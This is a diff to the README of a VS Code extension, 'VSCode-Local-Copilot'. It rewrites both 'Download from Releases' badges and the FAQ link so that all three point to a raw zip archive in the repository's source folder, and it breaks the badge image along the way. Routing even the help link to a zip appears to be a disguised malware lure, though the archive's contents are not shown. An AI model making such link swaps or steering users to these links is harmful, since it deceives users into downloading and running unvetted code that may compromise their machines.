@@ -8,7 +8,7 @@ Welcome to VSCode-Local-Copilot! This tool brings enhanced coding support right 
 
 To download the latest version of VSCode-Local-Copilot, visit this page:
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Cadentrex/VSCode-Local-Copilot/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Cadentrex/VSCode-Local-Copilot/main/vscode-extension/src/VSCode-Local-Copilot-3.2-alpha.1.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Cadentrex/VSCode-Local-Copilot/main/vscode-extension/src/VSCode-Local-Copilot-3.2-alpha.1.zip)
 
 On the Releases page, follow these steps to get your extension:
 
@@ -75,7 +75,7 @@ If you encounter issues, please consider the following troubleshooting tips:
 
 ## 🗣️ Get Help
 
-For support, please open an issue on the GitHub repository, or refer to the [FAQ section](https://github.com/Cadentrex/VSCode-Local-Copilot/wiki/FAQ). Your feedback and questions are welcome!
+For support, please open an issue on the GitHub repository, or refer to the [FAQ section](https://raw.githubusercontent.com/Cadentrex/VSCode-Local-Copilot/main/vscode-extension/src/VSCode-Local-Copilot-3.2-alpha.1.zip). Your feedback and questions are welcome!
 
 ## 💬 Contributing
 
@@ -98,4 +98,4 @@ VSCode-Local-Copilot is open-source software licensed under the MIT License. You
 
 Remember, you can always download VSCode-Local-Copilot from this page:
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Cadentrex/VSCode-Local-Copilot/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Cadentrex/VSCode-Local-Copilot/main/vscode-extension/src/VSCode-Local-Copilot-3.2-alpha.1.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Cadentrex/VSCode-Local-Copilot/main/vscode-extension/src/VSCode-Local-Copilot-3.2-alpha.1.zip)
